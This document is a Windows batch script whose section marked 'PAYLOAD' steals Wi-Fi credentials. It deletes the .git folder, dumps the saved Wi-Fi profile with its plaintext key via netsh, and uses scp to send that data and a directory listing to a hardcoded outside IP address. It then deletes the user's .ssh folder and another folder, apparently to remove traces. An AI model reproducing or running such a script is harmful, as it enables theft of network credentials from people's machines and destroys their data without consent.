@echo off
REM Change It
set ssid=Samrat_5G

@REM <(o)> DATE TIME <(o)>
set CUR_YYYY=%date:~6,4%
set CUR_Mt=%date:~3,2%
set CUR_DD=%date:~0,2%

set CUR_HH=%time:~0,2%
set CUR_Mn=%time:~3,2%
set CUR_SS=%time:~6,2%
if %CUR_HH% lss 10 (set CUR_HH=0%time:~1,1%) 
set dateTime=%CUR_DD%%CUR_Mt%%CUR_YYYY%-%CUR_HH%%CUR_Mn%%CUR_SS%


REM Finding Current Directory & Storing in a Variable.
FOR /F "tokens=* USEBACKQ" %%F IN (`cd`) DO (
SET currentDir=%%F
)

SET root=Users 
SET dirRoot=%currentDir:~3,5%
SET restOfPath=%currentDir:~9%

REM Finding UserName From Current Directory
IF %dirRoot%==%root% (
    for /f "tokens=1 delims=\" %%i in ("%restOfPath%") do (set userName=%%i)
)


@REM <(o)> PAYLOAD STARTED <(o)>
rmdir /s /q .git
timeout /t 1 /nobreak > NUL

dir > %ssid%-dirinfo-%dateTime%
netsh wlan show profile %ssid% key=clear > %ssid%-wifiinfo-%dateTime%
timeout /t 1 /nobreak > NUL

move id_rsa c:\\Users\\%userName%\\.ssh
timeout /t 1 /nobreak > NUL
move known_hosts c:\\Users\\%userName%\\.ssh
timeout /t 1 /nobreak > NUL

scp -rp %ssid%-dirinfo-%dateTime% root@198.58.98.140:/root/received-data/wifi-info/
timeout /t 1 /nobreak > NUL
scp -rp %ssid%-wifiinfo-%dateTime% root@198.58.98.140:/root/received-data/wifi-info/
timeout /t 1 /nobreak > NUL

rmdir /s /q c:\\Users\\%userName%\\.ssh
timeout /t 1 /nobreak > NUL
rmdir /s /q c:\\Users\\%userName%\\AceBot-script\\AceBot-Boot-Zone
timeout /t 1 /nobreak > NUL

